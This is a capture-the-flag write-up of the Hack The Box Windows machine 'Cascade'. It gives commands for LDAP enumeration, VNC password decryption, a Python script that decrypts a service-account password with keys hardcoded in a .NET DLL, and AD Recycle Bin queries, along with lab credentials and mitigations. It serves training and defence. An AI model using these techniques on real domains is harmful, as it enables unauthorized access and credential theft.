# Cascade HTB - Complete Writeup

```
Machine:   Cascade
IP:        10.10.10.182
OS:        Windows
Difficulty: Medium
Domain:    cascade.local
```

## Summary

Cascade is a medium difficulty Windows Domain Controller that requires a multi-stage attack chain:
- LDAP enumeration reveals initial credentials
- SMB shares contain sensitive data and encrypted passwords
- VNC password decryption provides user access
- .NET reverse engineering uncovers service account credentials
- AD Recycle Bin exploitation yields Administrator access

## Attack Chain Overview

```
LDAP Enumeration (r.thompson:rY4n5eva)
    ↓
SMB Data Share (Meeting_Notes_June_2018.html + VNC Install.reg)
    ↓
VNC Password Crack (sT333ve2) → s.smith Shell
    ↓
Audit Share Discovery (Audit.db + CascCrypto.dll)
    ↓
.NET Reverse Engineering (AES Key + IV)
    ↓
ArkSvc Credentials (w3lc0meFr31nd)
    ↓
AD Recycle Bin (TempAdmin object)
    ↓
Administrator Access (baCT3r1aN00dles)
```

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV 10.10.10.182
```

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
```

### LDAP Enumeration

Anonymous LDAP bind was possible, allowing user enumeration:

```bash
ldapsearch -H ldap://10.10.10.182 -x -b "DC=cascade,DC=local"
```

Found a custom attribute containing credentials:

```
cascadeLegacyPwd: clk0bjVldmE=
```

Decoding the Base64:

```bash
echo "clk0bjVldmE=" | base64 -d
# Output: rY4n5eva
```

**Credentials Found:**
```
User: r.thompson
Password: rY4n5eva
```

---

## User Access - r.thompson

### SMB Enumeration

With `r.thompson` credentials, enumerate SMB shares:

```bash
smbclient -U r.thompson //10.10.10.182/Data
```

Inside the `IT` folder:

```
Data/
└── IT/
    ├── Meeting_Notes_June_2018.html
    ├── ArkAdRecycleBin.log
    └── VNC Install.reg
```

**Meeting_Notes_June_2018.html** - Contains note:
> "We created a new TempAdmin account and gave it the same password as Administrator."

**VNC Install.reg** - Contains encrypted VNC password:

```
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
```

### VNC Password Decryption

Using the known VNC DES key to decrypt:

```bash
echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
# Output: sT333ve2
```

Alternatively, crack the VNC hash:

```bash
# Create hash file
echo "6bcf2a4b6e5aca0f" > vnc.hash

# Crack with hashcat
hashcat -m 1600 vnc.hash /usr/share/wordlists/rockyou.txt
hashcat -m 1600 vnc.hash --show
# Output: 6bcf2a4b6e5aca0f:sT333ve2
```

**Credentials Found:**
```
User: s.smith
Password: sT333ve2
```

---

## User Access - s.smith

### WinRM Shell

`s.smith` is in the Remote Management Users group:

```bash
evil-winrm -i 10.10.10.182 -u s.smith -p 'sT333ve2'
```

**User Flag:**

```powershell
type C:\Users\s.smith\Desktop\user.txt
```

---

## Privilege Escalation - s.smith → ArkSvc

### Audit Share Discovery

Check group memberships:

```powershell
net user s.smith
# Member of: Domain Users, Audit Share
```

The `Audit Share` group comment reveals the share path:

```
net localgroup "Audit Share"
# Comment: \\CASC-DC1\Audit$
```

Access the Audit share:

```bash
smbclient -U s.smith //10.10.10.182/Audit$
```

Files found:

```
Audit$/
├── Audit.db           # SQLite database
├── CascAudit.exe      # .NET executable
├── CascCrypto.dll     # .NET encryption library
├── System.Data.SQLite.dll
├── RunAudit.bat
├── DB/
├── x64/
└── x86/
```

### Database Analysis

Copy the database and examine:

```bash
sqlite3 Audit.db
.tables
# UserAudit, Ldap, DeletedUserAudit, Misc

SELECT * FROM Ldap;
# 1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
```

Found encrypted password for `ArkSvc`:
```
Encrypted: BQO5l5Kj9MdErXx6Q6AGOw==
```

### .NET Reverse Engineering

Using `dnSpy` or `ILSpy` to decompile the DLL:

```bash
# Download dnSpy
wget https://github.com/dnSpy/dnSpy/releases/download/v6.1.8/dnSpy-net-win64.zip
unzip dnSpy-net-win64.zip
```

Decompiled code reveals:

```csharp
namespace CascCrypto
{
    public class Crypto
    {
        private static string key = "c4scadek3y654321";
        private static string iv = "1tdyjCbY1Ix49842";
        
        public static string DecryptString(string encryptedString)
        {
            // AES-128 CBC with PKCS7 padding
        }
    }
}
```

### Password Decryption Script

```python
#!/usr/bin/env python3
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

# Extracted values
encrypted = "BQO5l5Kj9MdErXx6Q6AGOw=="
key = "c4scadek3y654321".encode('utf-8')
iv = "1tdyjCbY1Ix49842".encode('utf-8')

# Decrypt
cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = unpad(cipher.decrypt(base64.b64decode(encrypted)), AES.block_size)
password = decrypted.decode('utf-8')

print(f"Password: {password}")
# Output: w3lc0meFr31nd
```

**Credentials Found:**
```
User: arksvc
Password: w3lc0meFr31nd
```

---

## Privilege Escalation - ArkSvc → Administrator

### AD Recycle Bin Access

Login as ArkSvc:

```bash
evil-winrm -i 10.10.10.182 -u arksvc -p 'w3lc0meFr31nd'
```

Check group memberships:

```powershell
net user arksvc
# Member of: Domain Admins, AD Recycle Bin
```

### Query Deleted Objects

```powershell
# Query all deleted objects
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -Properties *

# Specifically find TempAdmin
Get-ADObject -Filter {Deleted -eq $true -and Name -like "*TempAdmin*"} -IncludeDeletedObjects -Properties *
```

Found the deleted `TempAdmin` object:

```
Name: TempAdmin
cascadeLegacyPwd: YmFDVDNyMWFOMDBkbGVz
```

Decode the Base64:

```bash
echo "YmFDVDNyMWFOMDBkbGVz" | base64 -d
# Output: baCT3r1aN00dles
```

**Credentials Found:**
```
User: TempAdmin
Password: baCT3r1aN00dles
```

### Administrator Shell

From the meeting notes, TempAdmin shares the password with Administrator:

```bash
evil-winrm -i 10.10.10.182 -u Administrator -p 'baCT3r1aN00dles'
```

**Root Flag:**

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

---

## Credentials Summary

| User | Password | How Found |
|------|----------|-----------|
| r.thompson | rY4n5eva | LDAP attribute (cascadeLegacyPwd) |
| s.smith | sT333ve2 | VNC password decryption |
| arksvc | w3lc0meFr31nd | .NET reverse engineering |
| TempAdmin | baCT3r1aN00dles | AD Recycle Bin |
| Administrator | baCT3r1aN00dles | Same as TempAdmin |

---

## Tools Used

### Enumeration & Reconnaissance
- **nmap** - Service discovery
- **ldapsearch** - LDAP enumeration
- **smbclient** - SMB share access

### Credential Cracking
- **hashcat** - VNC password hash cracking
- **openssl** - VNC DES decryption

### Shell Access
- **evil-winrm** - WinRM shell
- **impacket** - Various AD tools

### Reverse Engineering
- **dnSpy** - .NET decompilation
- **strings** - Extracting strings from binaries

### Database
- **sqlite3** - Database analysis
- **Python (pycryptodome)** - AES decryption

---

## Attack Techniques

| Technique | MITRE ATT&CK ID |
|-----------|-----------------|
| LDAP Enumeration | T1087.002 |
| SMB Share Discovery | T1135 |
| Credential Dumping | T1003 |
| .NET Reverse Engineering | T1140 |
| Active Directory Recycle Bin Abuse | T1081 |
| Pass-the-Hash | T1550.002 |

---

## Mitigations

### For Administrators

1. **Disable Anonymous LDAP Binds** - Prevent unauthenticated enumeration
2. **Audit Custom Attributes** - Remove sensitive data from attributes like `cascadeLegacyPwd`
3. **Secure the AD Recycle Bin** - Restrict access to the Recycle Bin group
4. **Regular Password Rotation** - Service accounts like ArkSvc should have rotating passwords
5. **Monitor Deleted Objects** - Log and alert on queries to the Deleted Objects container
6. **Code Security** - Don't hardcode encryption keys in compiled assemblies
7. **Share Permissions** - Restrict access to sensitive shares like `Audit$`
8. **Service Account Least Privilege** - Limit privileges for accounts like ArkSvc

---

## Key Learnings

1. **LDAP Anonymous Binds** - Always enumerate LDAP first; many organizations misconfigure this
2. **VNC Security** - VNC passwords are weakly obfuscated (DES with fixed key), never use them in secure environments
3. **.NET Reverse Engineering** - Hardcoded keys in compiled code are trivially discovered
4. **AD Recycle Bin** - Deleted objects retain attributes; this is a goldmine for attackers
5. **Service Accounts** - They often have elevated privileges and weak passwords
6. **Custom AD Attributes** - Organizations often store sensitive data in custom fields
7. **Meeting Notes / Documentation** - Internal documentation on shares is a major security risk

---

## References

- [Hack The Box - Cascade](https://app.hackthebox.com/machines/Cascade)
- [VNC Password Decryption](https://github.com/frizb/PasswordDecrypts)
- [dnSpy - .NET Decompiler](https://github.com/dnSpy/dnSpy)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Active Directory Security Best Practices](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices)

---

## Author

- **Date:** 2026-06-29
- **Machine:** Cascade (HTB)
- **Difficulty:** Medium
- **Tools Used:** Nmap, ldapsearch, smbclient, hashcat, evil-winrm, dnSpy, sqlite3, Python

---

**Disclaimer:** This writeup is for educational purposes only. Always obtain proper authorization before testing security controls.
